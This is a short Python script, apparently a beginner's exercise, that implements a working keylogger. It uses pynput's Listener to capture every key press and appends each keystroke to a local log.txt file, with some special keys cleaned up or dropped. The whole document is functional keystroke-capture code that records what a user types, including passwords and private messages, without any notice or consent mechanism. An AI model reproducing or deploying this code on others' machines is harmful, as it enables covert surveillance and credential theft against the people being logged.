#storingkeystrokes on text file
#listeners - listen to key strokes 
#with = release memory/resources automatically

#w=write r=read a=append
#basic storing of text (file handling) code
#file1 = open("log.txt", 'w')
#file1.write("\n")
#file1.close()

from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")

    #to remove keystokes input
    if letter == 'Key.space':
        letter = " "
    if letter == 'Key.alt_l':
        letter = "" 
    if letter == 'Key.tab':
        letter = "" 

    #write at file
    with open("log.txt", 'a') as file1:
        file1.write(letter)

with Listener(on_press=writetofile) as recordedstrokes:
    recordedstrokes.join()